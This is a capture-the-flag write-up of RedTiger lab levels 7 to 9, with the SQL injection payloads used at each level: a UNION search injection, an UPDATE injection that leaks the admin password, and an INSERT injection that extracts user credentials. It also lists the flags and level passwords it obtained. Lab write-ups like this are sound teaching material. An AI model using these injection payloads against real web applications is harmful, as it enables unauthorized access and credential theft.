## Level 7

**URL:** https://redtiger.labs.overthewire.org/level7.php
**Target:** Get the name of the user who posted the news about google. Table: level7_news, column: autor
**Restrictions:** no comments, no substr, no substring, no ascii, no mid, no like

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503131426968.png" alt="image-20200503131426968" style="border:1px solid black;" />



Searching for the word `google` presented the requested article:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503131627542.png" alt="image-20200503131627542" style="border:1px solid black;" />



I assumed the query uses the `LIKE` function, and decided to search for `%` to fetch all results:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503131551817.png" alt="image-20200503131551817" style="border:1px solid black;" />



Looks like the database has 4 articles. I tried to search for `'` in order to get an error:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503131718412.png" alt="image-20200503131718412" style="border:1px solid black;" />



Turns out the query looks like this, where `[search]` can be defined by me:

```sql
SELECT news.*,text.text,text.title 
FROM level7_news news, level7_texts text 
WHERE text.id = news.id AND (text.text LIKE '%[search]%' OR text.title LIKE '%[search]%');
```

I used the following payload to present the authors instead of the articles' content:

```
[search] = foo') UNION SELECT news.*,news.autor,text.title FROM level7_news news, level7_texts text WHERE (text.title = 'Google: The browser is the computer' OR ''='
```

This changed the query to:

```sql
SELECT news.*,text.text,text.title 
FROM level7_news news, level7_texts text 
WHERE text.id = news.id AND (text.text LIKE '%foo') 
UNION 
SELECT news.*,news.autor,text.title 
FROM level7_news news, level7_texts text 
WHERE (text.title = 'Google: The browser is the computer' OR ''='%' OR text.title LIKE '%foo') 
UNION 
SELECT news.*,news.autor,text.title 
FROM level7_news news, level7_texts text 
WHERE (text.title = 'Google: The browser is the computer' OR ''='%');
```

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503134410967.png" alt="image-20200503134410967" style="border:1px solid black;" />



I could see the four authors, and tried them until I reached the right one (**TestUserforg00gle**). I received the flag (**970cecc0355ed85306588a1a01db4d80**) and the password for Level 5 (**or_so_i'm_told**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503140130137.png" alt="image-20200503140130137" style="border:1px solid black;" />



## Level 8

**URL:** https://redtiger.labs.overthewire.org/level8.php
**Target:** Get the password of the admin.

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503225903120.png" alt="image-20200503225903120" style="border:1px solid black;" />



After trying various inputs to cause errors, I entered the following: Email: `'1`, Name: `2`, ICQ: `3`,  AGE: `4`. I received the following error:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503230440368.png" alt="image-20200503230440368" style="border:1px solid black;" />



From the error it seems that this is an `UPDATE` query (commas instead of `AND`), that probably looks similar to this:

```sql
UPDATE tablename 
SET name = '[name]' ,
	email = '[email]' , 
	icq = '[icq]' , 
	age = '[age]' 
WHERE id = 1;
```

I decided to send the value `' , name=password , icq='` to parameter "email", so that the query will become:

```sql
UPDATE tablename 
SET name = '[name]' ,
	email = '' , 
	name=password , 
	icq='' , 
	icq = '[icq]' , 
	age = '[age]' 
WHERE id = 1;
```

The password (**19JPYS1jdgvkj**) was presented in the "Name" field:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503231852360.png" alt="image-20200503231852360" style="border:1px solid black;" />



I used the password with the username "Admin" to log in, and received the flag (**9ea04c5d4f90dae92c396cf7a6787715**) and the password for Level 9 (**network_pancakes_milk_and_wine**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503232215364.png" alt="image-20200503232215364" style="border:1px solid black;" />



## Level 9

**URL:** https://redtiger.labs.overthewire.org/level9.php
**Target:** Get username and password of any user. Tablename: level9_users
**Hint:** This is not a blind injection. There is a way to get some output back:)

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200505130105460.png" alt="image-20200505130105460" style="border:1px solid black;" />



Filling the fields and sending the form added a new article and presented it:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200505130455987.png" alt="image-20200505130455987" style="border:1px solid black;" />



I assumed this is an `INSERT` query that looks like the following:

```sql
INSERT 
INTO table_name (name, title, content)
VALUES 	('[name]', '[title]', '[content]'),
		((SELECT  user FROM level9_users),(SELECT  password FROM level9_users),'');
```

Trying to send `'` in the different fields showed that only the "content" field causes an error.  Since the query expects only 3 columns to be entered, I had to make it create another row to present the requested data.

I decided to enter the following payload in the "content" field:  `'), ((SELECT  user FROM level9_users),(SELECT  password FROM level9_users),'`

The query becomes:

```sql
INSERT 
INTO table_name (name, title, content)
VALUES 	('', '', ''),
		((SELECT  user FROM level9_users),(SELECT  password FROM level9_users),'');
```

Which plots the username (**TheBlueFlower**) and password (**this_oassword_is_SEC//Ure.promised!**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503235826857.png" alt="image-20200503235826857" style="border:1px solid black;" />



I used them and received the flag (**84ec870f1ac294508400e30d8a26a679**) and the password for Level 10 (**whatever_just_a_fresh_password**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200503235959215.png" alt="image-20200503235959215" style="border:1px solid black;" />
